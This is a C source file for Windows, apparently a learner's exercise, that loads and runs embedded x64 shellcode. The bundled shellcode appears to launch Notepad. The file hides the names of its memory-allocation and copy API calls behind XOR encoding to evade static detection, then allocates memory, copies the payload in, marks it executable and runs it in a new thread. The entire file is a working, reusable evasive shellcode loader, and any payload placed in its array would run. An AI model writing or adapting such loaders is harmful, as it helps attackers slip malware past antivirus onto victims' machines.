
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payload[279] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65,
	0x78, 0x65, 0x00
};


unsigned int payload_length = sizeof(payload);

LPVOID (WINAPI * ptrVirtualAlloc)( // definition of API function needed in this case
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

VOID (WINAPI * ptrRtlMoveMemory) (
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T         Length
);

BOOL (WINAPI * ptrVirtualProtect) (
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);


void DecryptXOR(char * encrypted_data, size_t data_length, char * key, size_t key_length) {
	int key_index = 0;
	
	for (int i = 0; i < data_length; i++) {
		if (key_index == key_length - 1) key_index = 0;

		encrypted_data[i] = encrypted_data[i] ^ key[key_index];
		key_index++;
	}
}

int main(void) {
    
	void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
    DWORD oldprotect = 0;

	char encryption_key[] = "123456789ABC";
    char strVirtualAlloc[] = { 0x67, 0x5b, 0x41, 0x40, 0x40, 0x57, 0x5b, 0x79, 0x55, 0x2d, 0x2d, 0x20 }; // XORed value for VirtualAlloc
	char strVirtualProtect[] = { 0x67, 0x5b, 0x41, 0x40, 0x40, 0x57, 0x5b, 0x68, 0x4b, 0x2e, 0x36, 0x26, 0x52, 0x46 };
    char strRtlMoveMemory[] = { 0x63, 0x46, 0x5f, 0x79, 0x5a, 0x40, 0x52, 0x75, 0x5c, 0x2c, 0x2d, 0x31, 0x48 };
	
	// Decrypt function name to original name
	DecryptXOR((char *)strVirtualAlloc, strlen(strVirtualAlloc), encryption_key, sizeof(encryption_key));
	ptrVirtualAlloc = GetProcAddress(GetModuleHandle("Kernel32.dll"), strVirtualAlloc);
	
	DecryptXOR((char *)strVirtualProtect, strlen(strVirtualProtect), encryption_key, sizeof(encryption_key));
	DecryptXOR((char *)strRtlMoveMemory, strlen(strRtlMoveMemory), encryption_key, sizeof(encryption_key));
	
	/*printf("%-20s : Function to call [1] \n", (char *)strVirtualAlloc);
	printf("%-20s : Function to call [2]\n", (char *)strVirtualProtect);*/
	// Obfuscation for the call into GetProcAddress in hex/xored isn't workin
	ptrVirtualProtect = GetProcAddress(GetModuleHandle("Kernel32.dll"), "VirtualProtect"); //v2 suppozed to change str to var strVirtualProtect
	ptrRtlMoveMemory = GetProcAddress(GetModuleHandle("Ntdll.dll"), "RtlMoveMemory");
	/*printf("%-20s : 0x%-016p\n", "VirtualProtect addr", (void *)ptrVirtualProtect);
	
*/	//const char strNtdDll[] = {};
	HMODULE hModule = GetModuleHandle("Ntdll.dll");

    if (hModule != NULL) {
        // Get function pointer for the decrypted function name
        FARPROC ptrRtlMoveMemory = GetProcAddress(hModule, "RtlMoveMemory");

        if (ptrRtlMoveMemory != NULL) {
            // Function pointer obtained successfully
            printf("Function pointer obtained successfully!");
            // You can now use ptrFunction to call the function
        } else {
            // Error obtaining function pointer
            printf("Error obtaining function pointer. Error code: ");
        }
    } else {
        // Error obtaining module handle
        printf("Error obtaining module handle. Error code: ");
    }

	
	
	// Allocate new memory buffer for payload
	alloc_mem = ptrVirtualAlloc(0, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);

	printf("\n[1] Press Enter to Continue\n");
	getchar();
	
	// Copy the decrypted payload to allocated memory
	ptrRtlMoveMemory(alloc_mem, payload, payload_length);
	
	printf("\n[1.2] Initialize the payload obfuscated\n");
	// Set the newly allocated memory to be executable
	retval = ptrVirtualProtect(alloc_mem, payload_length, PAGE_EXECUTE_READ, &oldprotect);

	printf("\n[2] Press Enter to Create Thread\n");
	getchar();

	// If VirtualProtect succeeded, run the thread that contains the shellcodePayload
	if ( retval != 0 ) {
			threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
			WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
